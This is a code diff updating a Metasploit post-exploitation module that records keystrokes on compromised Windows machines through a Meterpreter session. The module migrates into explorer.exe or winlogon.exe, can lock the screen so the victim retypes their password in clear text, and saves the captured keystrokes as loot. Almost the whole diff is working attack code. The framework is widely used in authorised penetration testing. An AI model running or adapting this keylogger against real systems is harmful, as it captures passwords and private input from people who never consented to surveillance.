@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::File
 
@@ -22,10 +18,11 @@ class Metasploit3 < Msf::Post
           to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon
           option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN
           option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text
-          password.
+          password. It is recommended to run this module as a job, otherwise it will tie up your framework user interface.
             },
         'License'        => MSF_LICENSE,
-        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
+                              'Josh Hale <jhale85446[at]gmail.com>'],
         'Platform'       => [ 'win' ],
         'SessionTypes'   => [ 'meterpreter', ]
 
@@ -34,49 +31,71 @@ class Metasploit3 < Msf::Post
       [
         OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
         OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
-        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes', 5]),
+        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds', 5]),
         OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
         OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
                 'explorer', ['explorer','winlogon','pid']])
 
-      ], self.class)
+      ])
     register_advanced_options(
       [
-        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false])
-      ], self.class)
+        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false]),
+        OptEnum.new('TimeOutAction', [true, 'Action to take when session response timeout occurs.',
+                'wait', ['wait','exit']])
+      ])
   end
 
-  # Run Method for when run command is issued
   def run
-
     print_status("Executing module against #{sysinfo['Computer']}")
     if datastore['MIGRATE']
-      case datastore['CAPTURE_TYPE']
-      when "explorer"
-        process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
-      when "winlogon"
-        process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
-      when "pid"
-        if datastore['PID'] and has_pid?(datastore['PID'])
-          pid_migrate(datastore['PID'])
-        else
-          print_error("If capture type is pid you must provide a valid one")
-          return
-        end
+      if datastore['CAPTURE_TYPE'] == "pid"
+        return unless migrate_pid(datastore['PID'], session.sys.process.getpid)
+      else
+        return unless process_migrate
       end
-
     end
 
-    if startkeylogger
-      keycap(datastore['INTERVAL'],set_log)
+    lock_screen if datastore['LOCKSCREEN'] && get_process_name == "winlogon.exe"
+
+    if start_keylogger
+      @logfile = set_log
+      keycap
     end
   end
 
-  # Returns the path name to the stored loot filename
+  # Initial Setup values
+  #
+  # @return [void] A useful return value is not expected here
+  def setup
+    @logfile = nil
+    @timed_out = false
+    @timed_out_age = nil  # Session age when it timed out
+    @interval = datastore['INTERVAL'].to_i
+    @wait = datastore['TimeOutAction'] == "wait" ? true : false
+
+    if @interval < 1
+      print_error("INTERVAL value out of bounds. Setting to 5.")
+      @interval = 5
+    end
+  end
+
+  # This function sets the log file and loot entry.
+  #
+  # @return [StringClass] Returns the path name to the stored loot filename
   def set_log
-    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log started at #{Time.now.to_s}\n", "keystrokes.txt", "User Keystrokes")
+    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log from #{get_process_name} on #{sysinfo['Computer']} with user #{client.sys.config.getuid} started at #{Time.now.to_s}\n\n", "keystrokes.txt", "User Keystrokes")
   end
 
+  # This writes a timestamp event to the output file.
+  #
+  # @return [void] A useful return value is not expected here
+  def time_stamp(event)
+    file_local_write(@logfile,"\nKeylog Recorder #{event} at #{Time.now.to_s}\n\n")
+  end
+
+  # This locks the Windows screen if so requested in the datastore.
+  #
+  # @return [void] A useful return value is not expected here
   def lock_screen
     print_status("Locking the desktop...")
     lock_info = session.railgun.user32.LockWorkStation()
@@ -87,116 +106,251 @@ class Metasploit3 < Msf::Post
     end
   end
 
-  # Method to Migrate in to Explorer process to be able to interact with desktop
-  def process_migrate(captype,lock)
-    print_status("Migration type #{captype}")
-    #begin
-    if captype == "explorer"
-      process2mig = "explorer.exe"
-    elsif captype == "winlogon"
+  # This function returns the process name that the session is running in.
+  #
+  # Note: "session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
+  #
+  # @return [String Class] the session process's name
+  # @return [NilClass] Session match was not found
+  def get_process_name
+    processes = client.sys.process.get_processes
+    current_pid = session.sys.process.getpid
+    processes.each do |proc|
+      return proc['name'] if proc['pid'] == current_pid
+    end
+    return nil
+  end
+
+  # This function evaluates the capture type and migrates accordingly.
+  # In the event of errors, it will default to the explorer capture type.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def process_migrate
+    captype = datastore['CAPTURE_TYPE']
+
+    if captype == "winlogon"
       if is_uac_enabled? and not is_admin?
-        print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
-
-      end
-      process2mig = "winlogon.exe"
-      if lock
-        lock_screen
-      end
-    else
-      process2mig = "explorer.exe"
-    end
-    # Actual migration
-    mypid = session.sys.process.getpid
-    session.sys.process.get_processes().each do |x|
-      if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
-        print_status("\t#{process2mig} Process found, migrating into #{x['pid']}...")
-        session.core.migrate(x['pid'].to_i)
-        print_status("Migration successful!!")
+        print_error("UAC is enabled on this host! Winlogon migration will be blocked. Exiting...")
+        return false
+      else
+        return migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
       end
     end
-    return true
+
+    return migrate(get_pid("explorer.exe"), "explorer.exe", session.sys.process.getpid)
   end
 
-  # Method for migrating in to a PID
-  def pid_migrate(pid)
-    print_status("\tMigrating into #{pid}...")
-    session.core.migrate(pid)
-    print_status("Migration successful!")
+  # This function returns the first process id of a process with the name provided.
+  # It will make sure that the process has a visible user meaning that the session has rights to that process.
+  # Note: "target_pid = session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
+  #
+  # @return [Integer] the PID if one is found
+  # @return [NilClass] if no PID was found
+  def get_pid(proc_name)
+    processes = client.sys.process.get_processes
+    processes.each do |proc|
+      if proc['name'] == proc_name && proc['user'] != ""
+        return proc['pid']
+      end
+    end
+    return nil
   end
 
-  # Method for starting the keylogger
-  def startkeylogger()
-    begin
-      #print_status("Grabbing Desktop Keyboard Input...")
-      #session.ui.grab_desktop
-      print_status("Starting the keystroke sniffer...")
-      session.ui.keyscan_start
+  # This function attempts to migrate to the specified process by Name.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def migrate(target_pid, proc_name, current_pid)
+    if !target_pid
+      print_error("Could not migrate to #{proc_name}. Exiting...")
+      return false
+    end
+
+    print_status("Trying #{proc_name} (#{target_pid})")
+
+    if target_pid == current_pid
+      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
       return true
-    rescue
-      print_error("Failed to start the keystroke sniffer: #{$!}")
+    end
+
+    begin
+      client.core.migrate(target_pid)
+      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+     rescue Rex::Post::Meterpreter::RequestError => error
+      print_error("Could not migrate to #{proc_name}. Exiting...")
+      print_error(error.to_s)
       return false
     end
   end
 
-  # Method for writing found keystrokes
-  def write_keylog_data(logfile)
-    data = session.ui.keyscan_dump
-    outp = ""
-    data.unpack("n*").each do |inp|
-      fl = (inp & 0xff00) >> 8
-      vk = (inp & 0xff)
-      kc = VirtualKeyCodes[vk]
-
-      f_shift = fl & (1<<1)
-      f_ctrl  = fl & (1<<2)
-      f_alt   = fl & (1<<3)
-
-      if(kc)
-        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
-        case name
-        when /^.$/
-          outp << name
-        when /shift|click/i
-        when 'Space'
-          outp << " "
-        else
-          outp << " <#{name}> "
-        end
-      else
-        outp << " <0x%.2x> " % vk
-      end
+  # This function attempts to migrate to the specified process by PID only.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def migrate_pid(target_pid, current_pid)
+    if !target_pid
+      print_error("Could not migrate to PID #{target_pid}. Exiting...")
+      return false
     end
 
-    sleep(2)
-    if not outp.empty?
-      print_good("Keystrokes captured #{outp}") if datastore['ShowKeystrokes']
-      file_local_write(logfile,"#{outp}\n")
+    if !has_pid?(target_pid)
+      print_error("Could not migrate to PID #{target_pid}. Does not exist! Exiting...")
+      return false
     end
-  end
 
-  # Method for Collecting Capture
-  def keycap(keytime, logfile)
+    print_status("Trying PID: #{target_pid}")
+
+    if target_pid == current_pid
+      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+    end
+
     begin
-      rec = 1
-      #Creating DB for captured keystrokes
-      print_status("Keystrokes being saved in to #{logfile}")
-      #Inserting keystrokes every number of seconds specified
-      print_status("Recording keystrokes...")
-      while rec == 1
-        write_keylog_data(logfile)
-        sleep(keytime.to_i)
-      end
-    rescue::Exception => e
-      print_status "Saving last few keystrokes..."
-      write_keylog_data(logfile)
-      print_status("#{e.class} #{e}")
-      print_status("Stopping keystroke sniffer...")
-      session.ui.keyscan_stop
+      client.core.migrate(target_pid)
+      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+     rescue Rex::Post::Meterpreter::RequestError => error
+      print_error("Could not migrate to PID #{target_pid}. Exiting...")
+      print_error(error.to_s)
+      return false
     end
   end
 
-  def cleanup
-    session.ui.keyscan_stop rescue nil
+  # This function starts the keylogger
+  #
+  # @return [TrueClass] keylogger started successfully
+  # @return [FalseClass] keylogger failed to start
+  def start_keylogger
+    session.ui.keyscan_stop rescue nil #Stop keyscan if it was already running for some reason.
+    begin
+      print_status("Starting the keylog recorder...")
+      session.ui.keyscan_start
+      return true
+    rescue
+      print_error("Failed to start the keylog recorder: #{$!}")
+      return false
+    end
   end
 
+  # This function dumps the keyscan and uses the API function to parse
+  # the extracted keystrokes.
+  #
+  # @return [void] A useful return value is not expected here
+  def write_keylog_data
+    output = session.ui.keyscan_dump
+
+    if not output.empty?
+      print_good("Keystrokes captured #{output}") if datastore['ShowKeystrokes']
+      file_local_write(@logfile,"#{output}\n")
+    end
+  end
+
+  # This function manages the key recording process
+  # It stops the process if the session is killed or goes stale
+  #
+  # @return [void] A useful return value is not expected here
+  def keycap
+    rec = 1
+    print_status("Keystrokes being saved in to #{@logfile}")
+    print_status("Recording keystrokes...")
+
+    while rec == 1
+      begin
+        sleep(@interval)
+        if session_good?
+          write_keylog_data
+        else
+          if !session.alive?
+            vprint_status("Session: #{datastore['SESSION']} has been closed. Exiting keylog recorder.")
+            rec = 0
+          end
+        end
+      rescue::Exception => e
+        if e.class.to_s == "Rex::TimeoutError"
+          @timed_out_age = get_session_age
+          @timed_out = true
+
+          if @wait
+            time_stamp("timed out - now waiting")
+            vprint_status("Session: #{datastore['SESSION']} is not responding. Waiting...")
+          else
+            time_stamp("timed out - exiting")
+            print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
+            rec = 0
+          end
+        elsif e.class.to_s == "Interrupt"
+          print_status("User interrupt.")
+          rec = 0
+        else
+          print_error("Keylog recorder on session: #{datastore['SESSION']} encountered error: #{e.class} (#{e}) Exiting...")
+          @timed_out = true
+          rec = 0
+        end
+      end
+    end
+  end
+
+  # This function returns the number of seconds since the last time
+  # that the session checked in.
+  #
+  # @return [Integer Class] Number of seconds since last checkin
+  def get_session_age
+    return Time.now.to_i - session.last_checkin.to_i
+  end
+
+  # This function makes sure a session is still alive acording to the Framework.
+  # It also checks the timed_out flag. Upon resume of session it resets the flag so
+  # that logging can start again.
+  #
+  # @return [TrueClass] Session is still alive (Framework) and not timed out
+  # @return [FalseClass] Session is dead or timed out
+  def session_good?
+    return false if !session.alive?
+    if @timed_out
+      if get_session_age < @timed_out_age && @wait
+        time_stamp("resumed")
+        @timed_out = false       #reset timed out to false, if module set to wait and session becomes active again.
+      end
+      return !@timed_out
+    end
+    return true
+  end
+
+  # This function writes off the last set of key strokes
+  # and shuts down the key logger
+  #
+  # @return [void] A useful return value is not expected here
+  def finish_up
+    print_status("Shutting down keylog recorder. Please wait...")
+
+    last_known_timeout = session.response_timeout
+    session.response_timeout = 20 #Change timeout so job will exit in 20 seconds if session is unresponsive
+
+    begin
+      sleep(@interval)
+      write_keylog_data
+    rescue::Exception => e
+      print_error("Keylog recorder encountered error: #{e.class.to_s} (#{e.to_s}) Exiting...") if e.class.to_s != "Rex::TimeoutError" #Don't care about timeout, just exit
+      session.response_timeout = last_known_timeout
+      return
+    end
+    session.ui.keyscan_stop rescue nil
+    session.response_timeout = last_known_timeout
+  end
+
+  # This function cleans up the module.
+  # finish_up was added for a clean exit when this module is run as a job.
+  #
+  # Known Issue: This appears to run twice when killing the job. Not sure why.
+  # Does not cause issues with output or errors.
+  #
+  # @return [void] A useful return value is not expected here
+  def cleanup
+    if @logfile #make sure there is a log file meaning keylog started and migration was successful, if used.
+     finish_up if session_good?
+     time_stamp("exited")
+    end
+  end
 end
